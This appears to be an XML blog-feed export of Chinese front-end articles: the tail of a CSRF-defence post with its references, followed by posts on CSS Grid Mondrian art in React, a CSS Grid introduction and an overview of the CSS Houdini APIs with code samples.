Preventing CSRF with the same-site cookie attribute
再见，CSRF：讲解set-cookie中的SameSite属性
SameSite Cookie，防止 CSRF 攻击
SameSite——防御 CSRF &amp; XSSI 新机制
Cross-Site Request Forgery is dead!

總結這篇主要介紹了 CSRF 的攻擊原理以及兩種防禦方法，針對比較常見的場景做介紹。一般在做網頁開發的時候，比起 XSS，CSRF 是一個比較常被忽略的重點。在網頁上有任何比較重要的操作時，都要特別留意是否有被 CSRF 的風險。
這次找了很多參考資料，但發現跟 CSRF 有關的文章其實都大同小異，想知道更細節的地方需要花很多的心力去找，但幸好 Stackoverflow 上面也有不少資料可以參考。因為我在資訊安全這塊沒有涉獵太多，如果文章有哪部分講錯的話，還麻煩各位在留言不吝指出。
也感謝我朋友 shik 的指點，告訴我有 SameSite 這麼一個東西，讓我補上最後一段。
希望這篇文章能讓大家對 CSRF 有更全面的認識。
參考資料
Cross-Site Request Forgery (CSRF)
Cross-Site Request Forgery (CSRF) Prevention Cheat Sheet
一次较为深刻的CSRF认识
[技術分享] Cross-site Request Forgery (Part 2)
Spring Security Reference
CSRF 攻击的应对之道

關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>csrf</tag>
        <tag>security</tag>
      </tags>
  </entry>
  <entry>
    <title>用 CSS Grid 創造蒙德里安藝術</title>
    <url>/2018/11/15/css-grid-art-generator/</url>
    <content><![CDATA[前言前陣子 netflix 上了最新一季的夜魔俠，其中的反派角色很愛在家中擺設畫作，有了藝術品襯托，壞人在我的腦海裡突然就變成看似很有深度的角色。這讓我覺得應該也該擺點畫作在家裡，看看能不能提高自己的層次。
而宅宅如我當然無法做如此的投資，不過如果能夠自己用 Web 技術產生一些藝術作品，然後投影在家中呢？應該很酷吧！然後就在 codepen 上發現了一個有趣的東西：
See the Pen Randomly generate Mondrian Art with CSS Grid + Vue 🎨 by Jhey (@jh3y) on CodePen.


看起來煞有其事啊！原來簡單利用 CSS Grid 就能排出這樣的藝術圖畫！ 查了一下這叫做蒙德里安 (mondrian art)。
臨摹也算是一種學習，原作者是使用 Vue.js 與 Stylus 製作，今天我們就簡單利用 React 來重新實作一次並說明原理吧！
CSS Grid 小複習如果有不了解 CSS Grid 的讀者，可以先去看我先前寫的介紹 - 與 CSS Grid 的第一次接觸 或是很完整的 A Complete Guide to Grid。
這邊簡單總結一下 CSS Grid 的特性：
相比於 Flexbox 是 one-dimensional layout solution，CSS Grid 可以理解為 two-dimentional layout solution。
也就是說，你能夠在二維平面上，透過網格系統來擺放你的元件位置。
現在最新版的 Chrome 與 Firefox 都已經支援 CSS Grid Layout 了，並且在 devtool 中能清楚看到網格狀態：

實作前的小分析不管你對 CSS Grid 有沒有概念，看了上面的圖應該也很快可以猜出其原理。
主要就是讓整個 container 切割成數個小方塊，接著隨機產生出多個區塊，每個區塊隨機橫跨不同的行數與列數，並填上不同顏色，將 container 填滿即可。
有點像是七巧板的感覺，只是我們的板子都是矩形~ 不過聽起來簡單，實作上還是有些細節需要注意的。
開始實作！第一步是先定義出我們這幅畫作的畫框，也就是 CSS Grid 中的 container，透過這個 container 來定義好整個網格系統：
.MondrainArt &#123;  background-color: &quot;#070908&quot;,  border: &quot;10px solid #070908&quot;,  display: &quot;grid&quot;,  grid-gap: &quot;10px&quot;,  grid-template-columns: &quot;repeat(auto-fit, 50px)&quot;,  grid-template-rows: &quot;repeat(auto-fit, 50px)&quot;,  height: &quot;300px&quot;,  overflow: &quot;hidden&quot;,  width: &quot;250px&quot;&#125;

這裡面發生了幾件事情：
我們用 grid-template-columns 與 grid-template-rows 先規範我們的 container 內要有多少欄與列，以及每格的長寬。
由於每個格子的大小我們要固定，所以使用 repeat()，並且採用 &lt;auto-repeat&gt; values 的語法，這樣做的好處是我們只要固定好 container 的寬高，不用去限制 grid 的 column 數與 row 數，讓 CSS Grid 幫我們計算出不會 overflow 的數目。MDN: repeat()
至於要用 auto-fit 或是 auto-fill， 在這邊的例子中其實都可以，因為這兩者的差別主要在於寬度改變時，針對多出的空間在運用上有不同的方式：
以 auto-fit 來說，視覺上的效果是會將原本 column 內的 item 寬度都平均拉長，但實際上還是有新增 column 數，只是因為 content 是空的，所以空間被壓縮了：
source
而 auto-fill 則是不管是否有新的 content 在，新增的 column 數都會佔有一樣的空間大小，並不會去延伸原有 item 的寬度：
source
接著，利用 gap: 10px 10px 設定好每個格子間的空隙；然後給定一個固定的寬高並將 overflow hidden 起來。
到這邊為止，我們可以先在 container 內放入數個 grid item，然後每個 item 的 grid-column 與 grid-row 皆設置為 span 1，也就是都只占 grid 的中的一個單位。如此一來就能看到目前的格子樣式：


隨機產生不同大小的區塊有了基礎的格子後，看起來我們接著只要把目前 grid item 的 grid-column 與 grid-row 改造一下就大功告成了吧!?
馬上來試試！
首先，先做點數學，我們剛剛設定每個格子是 50px，而每個格子的間距 gap 為 10px，而寬度為 250px，所以每一個 row 最多就是 4 個格子。（用肉眼看上圖其實就知道了…）
為什麼要算這個呢？
因為我們要讓 grid item 的 grid-column 與 grid-row 隨機分配，但要在正確的範圍內，更改上面範例內的 generateBlocks() 如下，並加上個 colorMap 來隨機分配顏色：
colorMap = &#123;  0: &quot;rgb(248, 217, 45)&quot;,  1: &quot;rgb(248, 217, 45)&quot;,  2: &quot;rgb(242, 245, 241)&quot;,  3: &quot;rgb(11, 84, 164)&quot;,  4: &quot;rgb(214, 0, 20)&quot;,  5: &quot;rgb(11, 84, 164)&quot;&#125;;generateBlocks = () =&gt; &#123;  return Array.from(Array(20).keys()).map(i =&gt; (    &lt;div      key=&#123;`blocks-$&#123;i&#125;`&#125;      style=&#123;&#123;        gridColumn: `span $&#123;Math.floor(Math.random() * 3 + 1)&#125;`,        gridRow: `span $&#123;Math.floor(Math.random() * 3 + 1)&#125;`,        backgroundColor: this.colorMap[Math.floor(Math.random() * 5)]      &#125;&#125;    /&gt;  ));&#125;;

可以得到以下結果：


疑？好像跟想像不太一樣？
的確是隨機產生了橫跨不同欄位數的區塊，但是大小好像不太對啊！
那是因為我們沒辦法保證隨機產生的 grid-area 都能剛剛好接續著各自的起始點排滿滿的，所以可能發生下列情況：

在右下角實際產生的黃色區塊前，row5 與 row6 的位置實際上是空的，所以 grid layout 會將其當作為高度 0 的 item。
好在，我們可以利用 grid-auto-columns 與 grid-auto-rows 來解決！css-tricks
我們在 container 加上以下設定：
grid-auto-columns: &quot;50px&quot;,grid-auto-rows: &quot;50px&quot;,

這樣就會讓 grid layout 知道空的欄位我們想要自動填補上 50px 的大小。
基本上到此為止就完成了一個不錯的版本：

但總還是覺得怪怪的，好像“不夠密”。
有些區塊如果能換個位置似乎會好看一點？
由於我們並沒有明確指定每個區塊在 grid 中的確切位置，grid layout 會採用一個 auto-placement algorithm 來擺放，而我們能透過 grid-auto-flow 這個屬性來更改其排放的規則。css-tricks
grid-auto-flow 有 row, column 與 dense 這三種值可以設置，從字面上來看就能理解各自代表的意思，如果你設定為 row 或 column，那 grid layout 會盡量幫你的 item 照著列與行的方向照順序排放；而 dense 則是會盡量把空間塞滿，小的 item 就可能會先排在大的 item 之前，跟你在 html dom 上的排放位置可能有所落差，對於 accessibility 並不好，但以我們的 case 來說，不需要考慮那些，就大膽採用 dense 就對了！
最終成果最後我們可以再加上一點點動畫效果，讓 react component 每五秒重新 render 一次新的圖案，這樣投放出來以後，就好像你有一幅不斷自行變化的藝術品一般了！


結論有趣的作品實作起來可能原理很簡單，但也是有一些眉眉角角需要注意。透過這次的實作，重新複習了一次 CSS Grid 的好處與用法，也期許自己未來能夠有更多的時間去思考與創造這樣的作品！
資料來源
A Complete Guide to Grid
Randomly generate Mondrian Art with CSS Grid + Vue 🎨
Grid by Example
css-grid-polyfill

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>react</tag>
        <tag>css</tag>
        <tag>grid</tag>
        <tag>mondrian</tag>
      </tags>
  </entry>
  <entry>
    <title>與 CSS Grid 的第一次接觸</title>
    <url>/2017/02/03/css-grid-intro/</url>
    <content><![CDATA[前言建構網頁佈局是製作網站的基本動作之一，隨著設計多樣性與功能複雜度的提升，開發者必須利用 table, inline, float, clear, 或是 positioning 等方式來 hack 頁面配置，但不管是哪種方式都各自有其缺乏的功能，也因此催生出許多 CSS Framework 提供的 Grid System 來加速佈局開發。
幾年前出現的 FlexBox 宛如神兵利器，讓我們可以擺脫這些困擾，快速進行排版，而隨著 CSS Grid 規範的出現，我們即將有更好的武器了！
CSS Grid 不是要來取代 Flexbox，他們是相輔相成的角色，flex 可以看作是 one-dimensional layout solution，CSS Grid 則是 two-dimentional layout solution，用來解決我們所有先前需要各種 hack 才能完成的頁面佈局。
不過可惜的是，CSS Grid 還在 W3C working draft 中，並且直到 2017 的今天，還是有些人使用不支援 flex 的舊瀏覽器…


從上圖可以得知，Chrome 跟 Firefox 的下一個版本都會預設支援 CSS Grid，而 IE&#x2F;Edge 目前則是支援舊版本的規格實作的。如果想要先嚐鮮，可以直接下載 Chrome Canary, Firefox Nightly 來使用，或是開啟目前版本的實驗功能：

Chrome: chrome://flags -&gt; 啟用 experimental Web Platform features
Firefox: about:config -&gt; 啟用 layout.css.grid.enabled

當然也有 Polyfill 可以使用。
雖然生不逢時，但這一切都是過程，活著不難，最難的是做人…啊啊蛋堡的歌真好聽
這篇文章主要是介紹 CSS Grid 的用法，並為我自己做個學習紀錄，畢竟網路上已經有許多關於 CSS Grid 的資源，我也條列了一些在文章最下方，懶得看我廢言的讀者可以自行參考！
CSS Grid Layout以往我們在進行頁面切版佈局的時候，即便是使用 flexbox，由於他是 one-dimensional layout，我們排版的方式無非就是從上往下排，或是由左到右等方向性來把各種 one-dimensional layout 組合成我們要的 two-dimensional layout。
而 CSS Grid 不同的地方就在於，他讓我們先定義好一個 container 就夠了，一個 container 來設定好所有底下元件可以擺放的位置。
什麼是“可以擺放的位置“呢？先跳過實作過程與這些屬性值的意思，以下面這張結果圖來解釋一下，你設定好 CSS Grid 的 container 後，該 container 會長成這副德性：
.container &#123;  grid-template-columns: 100px 10px 0.3fr 0.7fr;  grid-template-rows: 25% 100px auto;&#125;



然後你就只要把 container 內的元素，一一定義好各自的 CSS 屬性，來決定他們要擺在這圖中的哪個空格內即可。只要兩行 css，一個 div 就排好了，是不是很讓人興奮啊啊啊！
好的，接下來認真說明 CSS Grid 的其他基本用法。
CSS Grid Terminology再開始嘗試實作之前，我們先來了解並記憶一下相關的術語。

Grid Line: 分隔元素的線，可以是垂直與水平，如下圖的紅色線

Grid Track: 兩條分隔線中間的區域，簡單想就是 Grid 中的 Columns 或 Rows，如下圖的綠色區塊

Grid Cell: Grid 中的基本單位，四條線組成的區域，如下圖的藍色區塊。

Grid Area: 由數個 Cell 組成的區域，如下圖的紅色區塊。

fr: track-size 的單位，通常用於分配 row 或 column 的非彈性尺寸設定完後之剩餘空間。以下圖的 column為例，意思即：將去掉 100px 與 10px 後的剩餘空間，分配為 30% 與 70%。




Simple CSS Grid Example接著我們把上面的圖片，用 CSS Grid 來 layout 出來。
CSS Grid 的 properties 可以切成兩大塊，一塊是給 Parent 的，也就是 Grid Container，另一塊給 Children，Grid items。
詳細的 properties 介紹可以看這篇 Complete Guide Grid（ 強力推薦閱讀，各種圖片文字輔以 css 說明，完全可以直接左轉出去看這篇就好 XD ）
要使用 CSS Grid 就必須先定義好 Grid Container：
&lt;div class=&quot;grid-container&quot;&gt;  &lt;div class=&quot;grid-item item-a&quot;&gt;Tack&lt;/div&gt;  &lt;div class=&quot;grid-item item-b&quot;&gt;Cell&lt;/div&gt;  &lt;div class=&quot;grid-item item-c&quot;&gt;Area&lt;/div&gt;&lt;/div&gt;
在 grid container 底下的 children 是沒有順序差別的，我們都可以透過定義 grid items 的 properties 來設定他的擺放位置。當然，如果你沒有設定的話，就會照順序放置，如果該列放不下就會自動放到下一行。
但基本上不會這麼做，畢竟我們就是想要能好好掌控位置啊！
Grid Container 的 css 可以用下面兩種方式來寫，grid-template-columns 用來定義這個 Grid 有幾個 columns，每個 column 可以有多少寬度；換而言之，grid-template-rows 就是用來定義 row 的屬性。
grid-template-columns 和 grid-template-rows 有兩個主要 Values 可以設定：

track-size：可以是任何長度(px)、百分比(%)或是先前提到的 fr
line-name：組成 column 與 row 的線的名字

.container &#123;  grid-template-columns: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;  grid-template-rows: &lt;track-size&gt; ... | &lt;line-name&gt; &lt;track-size&gt; ...;&#125;

也就是說，你可以用純數字的方式來給予屬性質：
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: 100px 10px 0.3fr 0.7fr;  grid-template-rows: 25% 100px auto;&#125;

也可以安插 Grid Line 的名字在屬性值的設定中，這個名字在後續我們要安置 children 時可以用到！[Note] 要注意，因為是定義 線 的名字，所以最後一個數字的後面也可以定義名字喔！
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: [line1] 100px [line2] 10px [line3] 0.3fr [line4] 0.7fr [end];  grid-template-rows: [row-1-start] 25% [row-2-start] 100px [row-3-start] auto [row-end];&#125;

這樣我們就定義好需要的 Grid Container 了。
接著，我們說明一下如何將前面的圖片中的 ** Area ** 這個 Grid Item 放到我們剛剛定義好的 Grid Container 中，因為他的位置比較特殊，在右下角的位置，較好展現 CSS Grid 方便之處。
Grid Item 的屬性基本上就是四個：grid-column-start, grid-column-end, grid-row-start 和 grid-row-end，你也可以簡化成兩個：grid-column 與 grid-row。
grid-column-start, grid-column-end, grid-row-start 和 grid-row-end 可以有四種 Values 設定：

line： 對照到 Grid Container 中定義的線，可以是數字或名字。
span [number]：該 item 會橫跨 [number] 個 tracks。
span [name]：該 item 會橫跨到名字是 [name] 的線為止。
auto：自動放置，類等於 span 1。

.item-area &#123;  background-color: #C57474;  grid-column-start: line2;  grid-column-end: end;  grid-row-start: row-3-start;  grid-row-end: row-end;	&#125;

若只用兩個屬性，中間以 &#x2F; 隔開：
.item-area &#123;  background-color: #C57474;  grid-column: line2 / end;  grid-row: row-3-start / row-end;&#125;

以此類推，完成的範例如下：
See the Pen CSS-Grid-Sample by Arvin (@arvin0731) on CodePen.



Another CSS Grid ExampleContainer 不只有上面的寫法，還有一個叫做 grid-template-areas 的東西，搭配 Grid-Item 的 grid-area 可以有更簡單的寫法來進行排版。
我們這邊換個例子，以一般網頁較常見的配置來說明：
See the Pen CSS-Grid-Sample-Area by Arvin (@arvin0731) on CodePen.


用了 grid-template-areas 後，在 container 的 css 中，我們可以直接定義每個元素的位置：
.grid-container &#123;  height: 100vh;  display: grid;  grid-template-columns: 0.25fr 0.25fr 0.25fr 0.25fr;  grid-template-rows: auto;  grid-template-areas: &quot;header header header header&quot;                       &quot;main main . sidebar&quot;                       &quot;footer footer footer footer&quot;;  grid-column-gap: 10px;  grid-row-gap: 15px;&#125;

裡面的 header, main, sidebar 與 footer 就是在 Grid-Item 中我們要指定的名稱：
grid-template-areas 的每一行定義了 Grid-Item 內容：

第一行代表：header 要佔據四行。
第二行代表：main 佔兩行，而 sidebar 佔一行，其中 · 類似 placeholder 的作用。
第三行代表：footer 佔四行。

.header &#123;  background-color: #8BC574;  grid-area: header;&#125;.main &#123;  background-color: #748CC5;  grid-area: main;&#125;.sidebar &#123;  background-color: #C57474;  grid-area: sidebar;&#125;.footer &#123;  background-color: #FCE052;  grid-area: footer;&#125;
此外，grid-column-gap 與 grid-row-gap 可用來設定行距。
One more thing除了上述的基本屬性運用外，最前面有說過 CSS Grid 跟 Flex 是相輔相成，而實際上他們可以調配的屬性也有類似的地方。
Grid Container 可以用 justify-items 與 align-items 來控制每個 Grid-item 的 垂直 與 水平 位置。
Grid Item 則是可以用 justify-self 與 align-self 來控制自己在網格中的位置。
像這個範例中的 Sidebar
See the Pen CSS-Grid-Sample-align by Arvin (@arvin0731) on CodePen.


歡迎大家參考這幾個個超詳細圖解說明：
Complete guide grid - justify-itemsComplete guide grid - align-itemsComplete guide grid - justify-selfComplete guide grid - align-self
Conclusion用幾個簡單的範例來學習並介紹 CSS Grid，但還是希望大家都能直接去 Codepen 上玩玩看 CSS Grid，一定都會被其方便性給驚豔到！前端發展雖然百家爭鳴，但是很多基本的規範如果能越來越統一越來越強大，開發者就更能省去各種 hacking 的時間，用來創造更多有創意又有美感的作品！
最後再推薦一個網站 Grid by Example，裡面用許多範例來進行教學，頁面也很清楚乾淨。有任何問題都歡迎大家指教！	
資料來源
A Complete Guide to Grid
Chris House Guide to Grid
CSS Grid 介紹
Grid by Example
css-grid-polyfill

關於作者：@arvinh 前端攻城獅，熱愛數據分析和資訊視覺化
]]></content>
      <tags>
        <tag>CSS</tag>
        <tag>WEB</tag>
        <tag>CSS-GRID</tag>
      </tags>
  </entry>
  <entry>
    <title>CSS 魔術師 Houdini API 介紹</title>
    <url>/2017/05/23/css-houdini/</url>
    <content><![CDATA[前言今天想繼續 CSS 的議題，常常會覺得學 CSS 的新發展不太划算，因為每次看到新的 Feature 出現，都只能當下興奮個幾分鐘，然後就會認命接受可能還要再等個五年才能真正使用的可能性…如果你有跟我一樣的感受，那今天這篇文章或許可以帶給你一絲絲希望。
在現今的 Web 開發中，JavaScript 幾乎佔據所有版面，除了控制頁面邏輯與操作 DOM 物件以外，連 CSS 都直接寫在 JavaScript 裡面了，就算瀏覽器都還沒有實作的規格，總會有人做出對應的 Polyfills，讓你快速的將新 Feature 應用到 Production 環境中，更別提我們還有 Babel 等工具幫忙轉譯。
而 CSS 就不同了，除了制定 CSS 標準規格所需的時間外，各家瀏覽器的版本、實作進度差異更是曠日費時，再加上 CSS 並非 Javascript 這樣的動態語言，我們無法簡單的提供 Polyfills，頂多利用 PostCSS、SASS 等工具來幫我們轉譯出瀏覽器能接受的 CSS，而剩下的就是瀏覽器的事了。
這邊讓我們回想一下，瀏覽器在網頁的渲染過程中，做了哪些事情？
source from google
瀏覽器的 Render Pipeline 中，JavaScript 與 Style 兩個階段會解析 HTML 並為載入的 JS 與 CSS 建立 Render Tree，也就是所謂的 DOM 與 CSSOM：（對於 Render Pipeline 與 Render Tree 若不了解，可以先看看我先前的文章 Front-end kata 60fps的快感）
source from google
而就現階段的 Web 技術來看，開發者們能操作的就是透過 JS 去控制 DOM 與 CSSOM，來影響畫面的變化，但是對於接下來的 Layout、Paint 與 Composite 就幾乎沒有控制權了。
既無法讓各家瀏覽器快速並統一實作規格，亦不能輕易產生 Polyfills，所以到現在我們依然無法大膽使用 Flexbox，即便它早在 2009 年就被提出了…
但 CSS 並非就此駐足不前。
為了解決上述問題，為了讓 CSS 的魔力不再被瀏覽器把持，Houdini 就誕生了！（ Houdini 是美國的偉大魔術師，擅長逃脫術，很適合想將 CSS 從瀏覽器中解放的概念）
CSS HoudiniCSS Houdini 是由一群來自 Mozilla, Apple, Opera, Microsoft, HP, Intel, IBM, Adobe 與 Google 的工程師所組成的工作小組，志在建立一系列的 API，讓開發者能夠介入瀏覽器的 CSS engine 運作，帶給開發者更多的解決方案，用來解決 CSS 長久以來的問題：

Cross-Browser isse
CSS Polyfill 的製作困難

Houdini task force 目前起草了一些 API 規範，並逐步努力讓其通過 W3C，成為真正的 Web standards。由於都是草稿階段，有些甚至只有規劃，還未被真正寫入規範，所以變動很大，有些我也不是很了解，所以就大致介紹一下，若有錯誤拜託務必告知！另外，有興趣的讀者可以直接從這裡 CSS Houdini Drafts 看詳細內容（ Drafts 的更新時間都非常近期，活躍中的草稿！）。
下面這張圖我將 Google 提供的 Render pipeline 與 Houdini: Maybe The Most Exciting Development In CSS You’ve Never Heard Of 中提到的 pipeline 做個結合對比，顯示出 Houdini 試圖在瀏覽器的 Render pipeline 中提供哪些 API 給開發者使用：

其中灰色部分就是只在規劃階段，而黃色部份就是已經寫入規範正在推行中。
Houdini API 介紹CSS Properties and Values API先介紹一個最能夠使用的 API，除了 IE family 以外，Chrome、Firefox 與 Safari 都已經能夠直接使用了！ caniuse
相信很多人都使用過 CSS Preprocessors，他給予開發者在 CSS 中使用變數的能力：
$font-size: 10px;$brightBlue: blue;.mark&#123;  font-size: 1.5 * $font-size;  color: $brightBlue&#125;

但其實使用 Preprocessors 還是有其缺點，像是不同的 Preprocessors 就有不同的 Syntax，需要額外 setup 與 compile，而現在 CSS 已經有原生的變數可以使用了！就是 CSS Properties and Values API！
SCSS 與 Native CSS Custom Properties 的一個主要差別可以看下圖：

原生的 CSS variable syntax：
/* declaration */--VAR_NAME: &lt;declaration-value&gt;;/* usage */var(--VAR_NAME)

變數可以定義在 root element selector 內，也能在一般 selector 內，甚至是給別的變數 reuse：
/* root element selector (全域) */:root &#123;  --main-color: #ff00ff;  --main-bg: rgb(200, 255, 255);  --block-font-size: 1rem;&#125;.btn__active::after&#123;  --btn-text: &#x27;This is btn&#x27;;  /* 相等於 --box-highlight-text:&#x27;This is btn been actived&#x27;; */  --btn-highlight-text: var(--btn-text)&#x27; been actived&#x27;;  content: var(--btn-highlight-text);  /* 也能使用 calc 來做運算 */  font-size: calc(var(--block-font-size)*1.5);&#125;body &#123;  /* variable usage */  color: var(--main-color);&#125;

而有了變數以後，會為 CSS 帶來什麼好處應該很明顯，他的 Use case 可以多寫一篇文章來介紹了，或是可以直接看這篇的詳細介紹，我這邊介紹幾個我覺得比較有趣的：

模擬一個特殊的 CSS rule:
 單純透過更改變數來達到改變 box-shadow 顏色
 .textBox &#123;--box-shadow-color: yellow;box-shadow: 0 0 30px var(--box-shadow-color);&#125;.textBox:hover &#123;/* box-shadow: 0 0 30px green; */--box-shadow-color: green;&#125;

動態調整某個 CSS rule 內的各別屬性：
 See the Pen Generated colors from CSS custom properties by Serg Hospodarets (@malyw) on CodePen.
 

此外，我們也可以用 JavaScript 來控制：
const textBox =   document.querySelector(&#x27;.textBox&#x27;);// GETconst Bxshc = getComputedStyle(textBox)    .getPropertyValue(&#x27;--box-shadow-color&#x27;);// SETtextBox.style    .setProperty(&#x27;--box-shadow-color&#x27;, &#x27;new color&#x27;);

非常好用的特性，幾乎所有主流瀏覽器都已經支援了，大家快來使用吧！
Box Tree APIBox tree API 並沒有出現在上圖中，但在 Paintin API 中會用到其概念。大家都知道在 DOM tree 中的每個元素都有一個 Box Modal，而在瀏覽器解析過程中，還會將其拆分成 fragments，至於什麼是 fragments？以 drafts 中的例子來解釋：
See the Pen fragments-sample by Arvin (@arvin0731) on CodePen.


上面的 HTML 總共就會拆出七個 fragments：

最外層的 div
第一行的 box (包含 foo bar)
第二行的 box (包含 baz)
吃到 ::first-line 與 ::first-letter 的 f 也會被拆出來成獨立的 fragments
只吃到 ::first-line 的 oo 只好也獨立出來
吃到 ::first-line 與 包在 &lt;i&gt; 內的 bar 當然也是
在第二行底下且為 italic 的 baz

而 Box tree API 目的就是希望讓開發者能夠取得這些 fragments 的資訊，至於取得後要如何使用，基本上應該會跟後面會介紹的 Parser API、Layout API 與 Paint API 有關聯，當我們能取得詳細的 Box Modal 資訊時，要客製化 Layout Module 才更為方便。
CSS Layout APILayout API 顧名思義就是提供開發者撰寫自己的 Layout module，Layout module 也就是用來 assign 給 display 屬性的值，像是 display: grid 或 display: flex。你只要透過 registerLayout 的 function，傳入 Layout 名稱與 JS class 來定義 Layout 的邏輯即可，例如我們實作一個 block-like 的 Layout：
blockLike.jsregisterLayout(&#x27;block-like&#x27;, class extends Layout &#123;    static blockifyChildren = true;    static inputProperties = super.inputProperties;    *layout(space, children, styleMap) &#123;        const inlineSize = resolveInlineSize(space, styleMap);        const bordersAndPadding = resolveBordersAndPadding(constraintSpace, styleMap);        const scrollbarSize = resolveScrollbarSize(constraintSpace, styleMap);        const availableInlineSize = inlineSize -                                    bordersAndPadding.inlineStart -                                    bordersAndPadding.inlineEnd -                                    scrollbarSize.inline;        const availableBlockSize = resolveBlockSize(constraintSpace, styleMap) -                                   bordersAndPadding.blockStart -                                   bordersAndPadding.blockEnd -                                   scrollbarSize.block;        const childFragments = [];        const childConstraintSpace = new ConstraintSpace(&#123;            inlineSize: availableInlineSize,            blockSize: availableBlockSize,        &#125;);        let maxChildInlineSize = 0;        let blockOffset = bordersAndPadding.blockStart;        for (let child of children) &#123;            const fragment = yield child.layoutNextFragment(childConstraintSpace);            // 這段控制 Layout 下的 children 要 inline 排列            // fragment 應該就是前述的 Box Tree API 內提到的 fragment            fragment.blockOffset = blockOffset;            fragment.inlineOffset = Math.max(                bordersAndPadding.inlineStart,                (availableInlineSize - fragment.inlineSize) / 2);            maxChildInlineSize =                Math.max(maxChildInlineSize, childFragments.inlineSize);            blockOffset += fragment.blockSize;        &#125;        const inlineOverflowSize = maxChildInlineSize + bordersAndPadding.inlineEnd;        const blockOverflowSize = blockOffset + bordersAndPadding.blockEnd;        const blockSize = resolveBlockSize(            constraintSpace, styleMap, blockOverflowSize);        return &#123;            inlineSize: inlineSize,            blockSize: blockSize,            inlineOverflowSize: inlineOverflowSize,            blockOverflowSize: blockOverflowSize,            childFragments: childFragments,        &#125;;    &#125;&#125;);

上面這段 code 是來自 houdini draft 的範例，完整放上來是想給大家看一下實作一個 Layout 需要注意的細節有多少，其實並不是如想像中的輕鬆，相信未來會出現更多方便的 API 輔助開發。（放心接下來不會再有這麼多 code 了 XD）
有了 Layout API，不管是自己實作或是拿別人寫好的 Layout，你都可以直接如下方式使用：
.wrapper &#123;    display: layout(&#x27;block-like&#x27;);&#125;

CSS Painting APIPainting API 與 Layout 類似，提供一個叫做 registerPaint 的方法：
定義 Paint Method，這邊偷偷用到了待會要介紹的 CSS Properties：
simpleRect.jsregisterPaint(&#x27;simpleRect&#x27;, class &#123;    static get inputProperties() &#123; return [&#x27;--rect-color&#x27;]; &#125;    paint(ctx, size, properties) &#123;        // 依據 properties 改變顏色        const color = properties.get(&#x27;--rect-color&#x27;);        ctx.fillStyle = color.cssText;        ctx.fillRect(0, 0, size.width, size.height);    &#125;&#125;);

宣告使用：
.div-1 &#123;    --rect-color: red;    width: 50px;    height: 50px;    background-image: paint(simpleRect);&#125;.div-2 &#123;    --rect-color: yellow;    width: 100px;    height: 100px;    background-size: 50% 50%;    background-image: paint(simpleRect);&#125;

.div-1 與 .div-2 就可以擁有各自定義寬高顏色的方形 background-image
Worklets在上述的 Layout API 與 Paint API 中，我們都有撰寫一支 js 檔案，用來定義新的屬性，然後在 css 檔案中呼叫取用，你可能會覺得那支 js 檔案就直接像一般 web 嵌入 js 的方式一樣即可，但實際上並非如此，我們需要透過 Worklets 來幫我們載入。以上面的 Paint API 為例：
// add a WorkletpaintWorklet.addModule(&#x27;simpleRect.js&#x27;);// WORKLET &quot;simpleRect.js&quot;registerPaint(&#x27;simpleRect&#x27;, class &#123;    static get inputProperties() &#123; return [&#x27;--rect-color&#x27;]; &#125;    paint(ctx, size, properties) &#123;        // 依據 properties 改變顏色        const color = properties.get(&#x27;--rect-color&#x27;);        ctx.fillStyle = color.cssText;        ctx.fillRect(0, 0, size.width, size.height);    &#125;&#125;);

同理，Layout API 則是 layoutWorklet.addModule(&#39;blockLike.js&#39;)。
Worklets 光名字就有點像 Web Worker 了，都是獨立於主要執行緒之外，並且不直接與 DOM 互動。你可能會想那為何還需要有一個 Worklets？
因為 Houdini 是希望將開發者的程式碼 hook 到 CSS engine 中運作，而根據規範內的敘述，web worker 相對笨重，不適合用來處理 CSS engine 這種可能會牽扯到數百萬畫素圖片的工作。所以可以推斷，Worklets 的特點就是輕量以及生命週期較短。
其實除了 Layout Worklets 與 Paint Worklets 外，還有所謂的 Animation Worklet，雖然還沒有放入規範，但已經有在著手進行中，也有 Polyfills 了，Chrome 的 Sticky Header 就是採用 Houdini 的 Animation Worklet。Twitter 的 Header Effect 也是採用 Animation WorkletAnimation Worklet 是想介入 Render Pipeline 中的 Composite 步驟，也就是原本利用 js 與 css 控制動畫時，瀏覽器會重新執行的部分。關於 Animation Worklet 的詳細實作介紹可以看這份投影片 houdini-codemotion
CSS Parser APIParser API 目前還是處在 Unofficial draft，但我相信如果這個 API 確認的話，對前端開發有絕對的幫助，她的概念是想讓開發者能擴充瀏覽器解析 HTML、CSS 的功能，也就是說，你可以想辦法讓他看得懂最新定義的 pseudo-classes 或甚至是 element-queries 等等，這樣就能正確解析出 CSSOM，從此不用再等瀏覽器更新。
CSS Typed OMCSS Typed OM 就是 CSSOM 的強化版，最主要的功能在於將 CSSOM 所使用的字串值轉換成具有型別意義的 JavaScript 表示形態，像是所有的 CSS Values 都有一個 base class interface：
interface CSSStyleValue &#123;    stringifier;    static CSSStyleValue? parse(DOMString property, DOMString cssText);    static sequence&lt;CSSStyleValue&gt;? parseAll(DOMString property, DOMString cssText);&#125;;

你可以如下操作 CSS style: (source from CSS Houdini- the bridge between CSS, JavaScript and the browser)source from [CSS Houdini- the bridge between CSS, JavaScript and the browser
// CSS -&gt; JSconst map = document.querySelector(&#x27;.example&#x27;).styleMap;console.log( map.get(&#x27;font-size&#x27;) );// CSSSimpleLength &#123;value: 12, type: &quot;px&quot;, cssText: &quot;12px&quot;&#125;// JS -&gt; JSconsole.log( new CSSUnitValue(5, &quot;px&quot;) );// CSSUnitValue&#123;value:5,unit:&quot;px&quot;,type:&quot;length&quot;,cssText:&quot;5px&quot;&#125;// JS -&gt; CSS// set style &quot;transform: translate3d(0px, -72.0588%, 0px);&quot;elem.outputStyleMap.set(&#x27;transform&#x27;,    new CSSTransformValue([        new CSSTranslation(          0, new CSSSimpleLength(100 - currentPercent, &#x27;%&#x27;), 0        )]));

根據 Drafts 的內容，有了型別定義，在 JavaScript 的操作上據說會有效能上的顯著提升。此外，CSS Typed OM 也應用在 Parser API 與 CSS Properties API 上。
